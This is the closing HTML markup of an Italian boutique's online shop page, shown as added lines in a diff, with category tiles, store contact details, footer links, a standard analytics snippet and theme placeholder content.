+<div class="sottotitolo3"><span style="font-family: 'courier new', courier; color: #000000;"><em><span style="font-size: x-large;">BEACHWEAR</span></em></span></div>
+</div>
+</div>
+</div>
+<div class="collection-item col-lg-3 col-md-3 col-sm-6 col-xs-6">
+<div class="collection-item-inner">
+<div class="collection-image" style="text-align: justify;"><a title="CAPPELLI" href="http://www.myvaleriashop.com/catalog/category/view/s/cappelli/id/116/"><img alt="FRANCESCA TANGHETTI" src="http://www.myvaleriashop.com/media/wysiwyg/cappelliB.jpg" /></a>
+<div class="sottotitolo3"><span style="color: #000000; font-family: 'courier new', courier; font-size: x-large;"><i>CAPPELLI</i></span></div>
+</div>
+</div>
+</div>
+</div>
+</div>								</div>
+							</div>	
+							
+							
+											
+						
+												
+							
+						
+							
+						
+													
+									</div>
+            </div>
+        </div>
+        <style>
+.asinistra{ text-align:left !important}
+</style>
+<div class="main-container col1-layout">
+<div class="main">
+<div class="col-main">
+<div class="container">
+<div class="std"><div class="no-display">&nbsp;</div></div>							
+</div>
+<div class="collection-wrap asinistra">
+<div class="container">	
+<div class="collection-container">
+<div class="row">
+<div class="collection-item col-lg-3 col-md-2 col-sm-6 col-xs-6">
+<div class="collection-item-inner">
+<div class="collection-image" style="color:#000">
+<img src="http://www.myvaleriashop.com/skin/frontend/pt_voke/default/images/purple/logo.png" width="150" style="margin-top:-5px; width:150px"/><br /><br />
+<strong>Valeria Boutique Srl a socio unico<br />
+Piazza Vescovado 2 - 25121 Brescia<br /></strong>
+<strong>+39 030 41043</strong><br />
+<a href="mailto:info@valeriashop.it" style="color:#F00">info@valeriashop.it</a>
+</div>
+</div>
+</div>	
+<div class="collection-item col-lg-3 col-md-2 col-sm-6 col-xs-6">
+<div class="collection-item-inner">
+<div class="collection-image">
+<strong>CONTATTI</strong><br /><br />
+<a href="/chi-siamo/" title="Chi siamo">Chi siamo</a><br />
+<a href="/contattaci/" title="Contattaci">Contattaci</a><br />
+<br />
+<a href="/guida-alle-taglie/" title="Guida alle taglie" class="guidataglie" style="color:#F00">Guida alle taglie</a><br />
+</div>
+</div>
+</div>	
+<div class="collection-item col-lg-3 col-md-2 col-sm-6 col-xs-6">
+<div class="collection-item-inner">
+<div class="collection-image">
+<strong>SERVIZI</strong><br /><br />
+<a href="/pagamenti-spedizioni/" title="Pagamenti e spedizioni">Pagamenti e spedizioni</a><br />
+<a href="/privacy/" title="Privacy">Privacy</a><br />
+<a href="/cookie-policy/" title="Cookie">Cookie</a><br />
+<a href="/customer/account/" title="Il tuo account">Il tuo account</a> </div>
+</div>
+</div>	
+<div class="collection-item col-lg-3 col-md-2 col-sm-6 col-xs-6">
+<div class="collection-item-inner">
+<div class="collection-image">
+<a href="https://www.facebook.com/pages/Valeria-Boutique/263790163710085?fref=ts" target="_blank" title="Facebook" class="iconasocialfb"></a>
+<a href="#" class="iconasocialin"></a>
+
+<br /><br />
+<a href="https://www.facebook.com/pages/Valeria-Boutique/263790163710085?fref=ts" target="_blank" title="Facebook">Facebook</a><br />
+<a href="#">Instagram</a>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>	
+</div>
+</div>
+</div>
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-34739507-10', 'auto');
+  ga('send', 'pageview');
+
+</script>
+<style>
+.footer-container{ display:none}
+</style>
+<div class="footer-container footer_style1">
+    <div class="footer">
+					<div class="footer-top">
+				<div class="container">
+					<div class="row">			
+						<div class="col-lg-4 col-md-4 col-sm-4 col-xs-12">
+							<div class="block-footer1-address">
+<img src="http://www.myvaleriashop.com/media/wysiwyg/footer-map.jpg" alt="" />
+<p>
+1234 Street Name, City Name<br/>
+Kingdom<br/>
+(123) 456-7890
+</p>
+</div>						</div>					
+						<div class="col-lg-4 col-md-4 col-sm-4 col-xs-12 border-left">
+							<div class="block-footer1-about">
+<div class="block-title-footer">About</div>
+<ul class="block-content-footer">
+<li><a href="# ">About Us</a></li>
+<li><a href="# ">Delivery Information</a></li>
+<li><a href="# ">Privacy Policy</a></li>
+<li><a href="# ">Terms & Conditions</a></li>
+<li><a href="# ">Contact Us</a></li>
+</ul>
+</div>							<div class="block-footer1-social">
+        <div class="block-title-footer">follow us</div>
+        <p>Pharetra, phasellus ducimus nec illo, sequi, quia duis natus.</p>
+	<ul>
+		<li class="facebook"><a data-icon="F" target="_blank" href="#" title="Facebook">Facebook</a></li>
+		<li class="twitter"><a data-icon="L" target="_blank" href="#" title="Twitter">Twitter</a></li>		
+		<li class="google"><a data-icon="G" target="_blank" href="#" title="Google+">Google+</a></li>
+                <li class="pinterest"><a data-icon=":" target="_blank" href="#" title="Pinterest">Pinterest</a></li>
+		<li class="skype"><a data-icon="H" target="_blank" href="#" title="Skype">Skype</a></li>
+	</ul>
+</div>						</div>						
+						<div class="col-lg-4 col-md-4 col-sm-4 col-xs-12 border-left">
+							<div class="block-footer1-support">
+<div class="block-title-footer">support</div>
+<ul class="block-content-footer">
+<li><a href="# ">Contact Us</a></li>
+<li><a href="# ">Helpdesk</a></li>
+<li><a href="# ">Livechat</a></li>
+<li><a href="# ">FaQ</a></li>
+<li><a href="# ">One More</a></li>
+</ul>
+</div>							<div class="block-footer1-newletter">
+<div class="block-title-footer">Newsletter</div>
+<p>Pharetra, phasellus ducimus nec illo, sequi, quia duis natus.</p>
+<form id="newsletter-validate-detail" action="newsletter/subscriber/new/" method="post">
+<div class="input-box"><input id="newsletter" class="input-text required-entry validate-email" title="Sign up for our newsletter" onfocus="if(this.value=='Enter your email') this.value='';" onblur="if(this.value=='') this.value='Enter your email';" type="text" name="email" value="Enter your email" /> <button type="submit" class="fa-paper-plane-o"><span>Send to us</span></button></div>
+</form>
+</div>						
+						</div>
+					</div>
+				</div>
+			</div>
+			<div class="footer-payment">
+				<div class="container">
+					<div class="block-payment">
+<ul>
+<li><a href="# "><img src="http://www.myvaleriashop.com/media/wysiwyg/payment/pay1.png" alt="" /></a></li>
+<li><a href="# "><img src="http://www.myvaleriashop.com/media/wysiwyg/payment/pay2.png" alt="" /></a></li>
+<li><a href="# "><img src="http://www.myvaleriashop.com/media/wysiwyg/payment/pay3.png" alt="" /></a></li>
+<li><a href="# "><img src="http://www.myvaleriashop.com/media/wysiwyg/payment/pay4.png" alt="" /></a></li>
+<li><a href="# "><img src="http://www.myvaleriashop.com/media/wysiwyg/payment/pay5.png" alt="" /></a></li>
+<li><a href="# "><img src="http://www.myvaleriashop.com/media/wysiwyg/payment/pay6.png" alt="" /></a></li>
+<li><a href="# "><img src="http://www.myvaleriashop.com/media/wysiwyg/payment/pay7.png" alt="" /></a></li>
+<li><a href="# "><img src="http://www.myvaleriashop.com/media/wysiwyg/payment/pay8.png" alt="" /></a></li>
+<li><a href="# "><img src="http://www.myvaleriashop.com/media/wysiwyg/payment/pay9.png" alt="" /></a></li>
+<li><a href="# "><img src="http://www.myvaleriashop.com/media/wysiwyg/payment/pay10.png" alt="" /></a></li>
+<li><a href="# "><img src="http://www.myvaleriashop.com/media/wysiwyg/payment/pay11.png" alt="" /></a></li>
+<li><a href="# "><img src="http://www.myvaleriashop.com/media/wysiwyg/payment/pay12.png" alt="" /></a></li>
+<li><a href="# "><img src="http://www.myvaleriashop.com/media/wysiwyg/payment/pay13.png" alt="" /></a></li>
+<li><a href="# "><img src="http://www.myvaleriashop.com/media/wysiwyg/payment/pay14.png" alt="" /></a></li>
+<li><a href="# "><img src="http://www.myvaleriashop.com/media/wysiwyg/payment/pay15.png" alt="" /></a></li>
+<li><a href="# "><img src="http://www.myvaleriashop.com/media/wysiwyg/payment/pay16.png" alt="" /></a></li>
+<li><a href="# "><img src="http://www.myvaleriashop.com/media/wysiwyg/payment/pay17.png" alt="" /></a></li>
+<li><a href="# "><img src="http://www.myvaleriashop.com/media/wysiwyg/payment/pay18.png" alt="" /></a></li>
+<li><a href="# "><img src="http://www.myvaleriashop.com/media/wysiwyg/payment/pay19.png" alt="" /></a></li>
+<li><a href="# "><img src="http://www.myvaleriashop.com/media/wysiwyg/payment/pay20.png" alt="" /></a></li>
+<li><a href="# "><img src="http://www.myvaleriashop.com/media/wysiwyg/payment/pay21.png" alt="" /></a></li>
+<li><a href="# "><img src="http://www.myvaleriashop.com/media/wysiwyg/payment/pay22.png" alt="" /></a></li>
+<li><a href="# "><img src="http://www.myvaleriashop.com/media/wysiwyg/payment/pay23.png" alt="" /></a></li>
+</ul>
+</div>				</div>
+			</div>
+			<div class="footer-under">
+				<address>Copyright &copy; 2015 Design & Development by <a title="paththemes.Com" href=" http://www.paththemes.Com/" target="_blank">Paththemes</a></address>
+			</div>	
+					
+    </div>
+</div>
+
+<a id="pt_backontop" class="fa-angle-up" href="#" title="Back to top"></a>
+
+                
+
+<script type="text/javascript">
+if (!('ETA_Options' in window)) {
+	window.ETA_Options = {
+		is_ajax_compare_enabled:   true,
+        is_ajax_checkout_enabled:  true,
+        is_ajax_wishlist_enabled:  true,
+        is_ajax_quickview_enabled: true,
+        
+        dim: {
+        	loading: {width: '260px'},
+        	confirm: {width: '320px'},
+        	options: {width: '320px'},
+        	iframe: {width: '800px'}        	
+        }
+	};
+}
+</script>
+<div id="ajax-loading" class="ajax-loading">
+    <div class="dialog">
+        <div class="content">
+            <div class="img-loader text-center">
+				<i class="fa fa-circle-o-notch fa-spin fa-3x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+<div role="dialog" tabindex="-1" id="ajax-messagebox" class="ajax-modal">
+	<div class="dialog">
+		<div class="content">
+			<div class="body">
+				<div class="iframe"></div>
+				<div class="message"></div>
+				<div class="options"></div>
+				<div class="actions"></div>
+    		</div>
+		</div>
+		<a class="xclose" title="Close" href="javascript:hideModal();void(0);"><span class="times">&times;</span><span class="sr-only">Close</span></a>
+	</div>
+</div>
+    </div>
+</div>
+
+</body>
+</html>
